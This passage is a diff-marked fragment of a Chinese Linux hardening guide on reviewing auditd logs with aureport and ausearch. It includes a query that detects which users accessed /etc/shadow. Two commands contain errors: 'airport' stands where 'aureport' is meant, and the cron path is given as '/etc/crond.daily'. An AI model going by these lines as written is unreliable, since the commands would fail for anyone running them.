+<pre><code><span class="operator">-e</span> <span class="number">2</span>
+</code></pre><p>通过这个设定，更改审计规则需要重启机器。</p>
+<h2 id="通过aureport总结和查看审计日志">通过aureport总结和查看审计日志</h2><p>仔细检查<code>aureport</code>的man页面。然后设计一系列便于日常研究审计日志的命令。这些命令可以通过在合适的命名文件在<code>/etc/crond.daily</code>中被加入到cron job中。(其它章节中有有关如何确保审计系统收集所有需要事件的信息)</p>
+<p>例如，为每个登录到机器的用户生成日报，可在<code>cron</code>中运行以下命令：</p>
+<pre><code>aureport -<span class="keyword">l</span> -i -ts yesterday -<span class="keyword">te</span> today
+</code></pre><p>查看所有异常行为审计活动，通常先从被触发审计规则摘要看起：</p>
+<pre><code><span class="comment">aureport</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">key</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">summary</span>
+</code></pre><p>如果违规访问很多，检查它们：</p>
+<pre><code><span class="comment">ausearch</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">key</span> <span class="comment">access</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">raw</span> <span class="comment">|</span> <span class="comment">aureport</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">summary</span>
+</code></pre><p>看看执行了哪些可执行文件：</p>
+<pre><code><span class="comment">ausearch</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">key</span> <span class="comment">access</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">raw</span> <span class="comment">|</span> <span class="comment">airport</span> <span class="literal">-</span><span class="comment">x</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">summary</span>
+</code></pre><p>如果非法访问发生在特定文件上，并且你想看看哪个用户做的：</p>
+<pre><code><span class="comment">ausearch</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">key</span> <span class="comment">access</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file</span> <span class="comment">/etc/shadow</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">raw</span> <span class="comment">|</span> <span class="comment">aureport</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">user</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">summary</span> <span class="literal">-</span><span class="comment">i</span>
+</code></pre><p>检查异常活动(比如网卡设备更改到混杂模式，进程异常中止，登录失败次数达到上限)</p>
+<pre><code>aureport <span class="comment">--anomaly</span>
+</code></pre><p>审计分析的基础是使用key来分类事件。有关使用ausearch获取SELinux问题的信息在其它章节讨论</p>
 
             
           </span>
